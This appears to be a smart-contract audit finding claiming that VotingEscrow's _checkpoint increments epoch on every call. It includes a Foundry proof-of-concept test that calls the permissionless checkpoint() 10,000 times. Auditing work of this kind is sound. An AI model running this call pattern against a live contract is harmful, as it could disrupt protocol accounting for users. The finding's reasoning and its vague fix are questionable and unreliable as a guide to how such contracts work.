# `_checkpoint(...)` function breaks accounting of the protocol and brick `epoch` update

## Summary
The `VotingEscrow:: _checkpoint(...)` function is called internally especially during crucial balance updates or changes and in the process, the `epoch` is updated ideally at the end of each complete week. The `epoch variable is used to track weekly accounting for the protocol.

## Vulnerability Detail
However, due to a logic error in the `_checkpoint(...)` function, the `epoch` variable is increased at every call to `_checkpoint(...)`.
Hence, the `epoch` can be incremented many times per block and even per epcoh which means that it is not a true measurement of weekly accounting for the protocol thus breaking accounting of the protocol

```solidity
    function _checkpoint(
        uint _tokenId,
        LockedBalance memory old_locked,
        LockedBalance memory new_locked
    ) internal {

       ...........

        // Go over weeks to fill history and calculate what the current point is
        {
            uint t_i = (last_checkpoint / WEEK) * WEEK;
            for (uint i = 0; i < 255; ++i) {
                // Hopefully it won't happen that this won't get used in 5 years!
                // If it does, users will be able to withdraw but vote weight will be broken
                t_i += WEEK;
                int128 d_slope = 0;
                ....
                
                last_point.blk = initial_last_point.blk + (block_slope * (t_i - initial_last_point.ts)) / MULTIPLIER;
   ->           _epoch += 1;
                if (t_i == block.timestamp) {
                    last_point.blk = block.number;
                    break;
                } else {
                    point_history[_epoch] = last_point;
                }
            }
        }


 ->     epoch = _epoch;
        // Now point_history is filled until t=now

             .......

            user_point_history[_tokenId][user_epoch] = u_new;
        }
    }
```

The `_checkpoint(...)` which updates the `epoch` function is used when locks are created, during withdraws and also when processing emissions in the  `RewardsDistributor::_checkpoint_total_supply(...)` function. It is also used when evaluating `totalSupplyAtT(...)`, `totalSupplyAt(...)`, `_balanceOfAtNFT(...)` which which are also crucial functions in VM protocol. Hence the reach of this vulnerabilty is protocol wide and can have dire impacts under different circumstances.

Worse yet (as shown in the POC below) anyone can permissionlessly and continuously call the [`checkpoint()`](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L817-L819) function

**CODED POC**
Add the test case below to the `VotingEscrow.t.sol` file and run `forge test --mt testScrewEpoch -vv`

<summary>Checkpoint breaks accounting test case</summary>


```solidity
    function testScrewEpoch() public {
        flowDaiPair.approve(address(escrow), TOKEN_1);
        uint256 lockDuration = 7 * 24 * 3600; // 1 week

        vm.warp(((block.timestamp / ONE_WEEK ) *  ONE_WEEK) + ONE_WEEK);
        emit log_named_uint("Epoch value at before the random checkpoint calls", escrow.epoch());
        assertEq(escrow.epoch(), 0);

        // Balance should be zero before and 1 after creating the lock
        assertEq(escrow.balanceOf(address(owner)), 0);
        escrow.create_lock(TOKEN_1, lockDuration);
        assertEq(escrow.currentTokenId(), 1);
        assertEq(escrow.ownerOf(1), address(owner));
        assertEq(escrow.balanceOf(address(owner)), 1);

        for (uint i = 0; i < 10000; i++) {
            escrow.checkpoint();
        }

        emit log_named_uint("Epoch value after the random checkpoint calls", escrow.epoch());

        vm.warp(((block.timestamp / ONE_WEEK ) *  ONE_WEEK) + ONE_WEEK);
    }
```
</details>

## Impact
The `_checkpoint(...)` function breaks accounting for the protocol wrongly incrementing the `epoch` at every call instead of every week's end. This can also breaks core protocol functionality and accounting for VM and external protocols that may integrate with it.

## Tool used
Foundry test

## Recommendation
Ensure at least 1 `epoch` has elapsed before going over weeks (in the `for` loop shown below) to fill history and calculating what the current point is 

```solidity
            uint t_i = (last_checkpoint / WEEK) * WEEK;
   ->>      for (uint i = 0; i < 255; ++i) {
                // Hopefully it won't happen that this won't get used in 5 years!
                // If it does, users will be able to withdraw but vote weight will be broken
                t_i += WEEK;
```
